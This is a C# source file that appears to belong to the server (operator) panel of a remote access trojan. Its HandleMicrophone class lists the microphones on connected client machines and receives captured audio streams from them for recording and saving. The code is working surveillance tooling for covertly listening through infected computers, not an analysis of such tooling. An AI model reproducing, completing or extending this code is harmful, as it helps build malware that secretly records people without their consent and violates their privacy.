using Server.Connection;
using Server.Forms;
using Server.MessagePack;
using System;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    class HandleMicrophone
    {
        public HandleMicrophone(MsgPack unpack_msgpack, Clients client)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "getMicrophones":
                    {
                        FormMicrophone micForm = (FormMicrophone)Application.OpenForms["Microphone:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        try
                        {
                            if (micForm != null)
                            {
                                micForm.Client = client;
                                micForm.timer1.Start();

                                foreach (string device in unpack_msgpack.ForcePathObject("List").AsString.Split(new[] { "->|" }, StringSplitOptions.RemoveEmptyEntries))
                                {
                                    if (!string.IsNullOrWhiteSpace(device))
                                        micForm.comboBox1.Items.Add(device.Trim());
                                }

                                if (micForm.comboBox1.Items.Count == 0)
                                    micForm.comboBox1.Items.Add("None");

                                micForm.comboBox1.SelectedIndex = 0;

                                if (micForm.comboBox1.Text == "None")
                                {
                                    client.Disconnected();
                                    return;
                                }

                                micForm.comboBox1.Enabled = true;
                                micForm.btnRecord.Enabled = true;
                                micForm.btnSave.Enabled = false;
                                micForm.labelWait.Visible = false;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }

                case "capture":
                    {
                        FormMicrophone micForm = (FormMicrophone)Application.OpenForms["Microphone:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        try
                        {
                            if (micForm != null)
                            {
                                byte[] audioData = unpack_msgpack.ForcePathObject("Data").GetAsBytes();
                                micForm.AppendAudioData(audioData);
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }
            }
        }
    }
}
